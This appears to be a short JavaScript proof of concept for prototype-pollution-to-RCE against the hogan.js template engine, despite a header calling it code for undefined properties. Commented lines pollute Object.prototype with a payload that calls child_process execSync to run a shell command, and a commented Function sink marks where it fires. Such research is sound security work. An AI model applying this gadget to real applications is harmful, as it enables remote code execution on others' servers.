// Generated code for handling undefined properties


const hogan = require("hogan.js");


/* Payload Injection*/
// inject property to root prototype
// Object.prototype.asString = '1';
// Object.prototype.name = '2';
// Object.prototype.inject = "},flag:process.mainModule.require(`child_process`).execSync(`touch ./attack.txt`).toString()}}//"

/* Test Application Part*/
const TEMPLATE = `
<p1>Template</p1>
`;
const template = hogan.compile(TEMPLATE);

// pp2rce sink
// Function(`return ${template}`)();
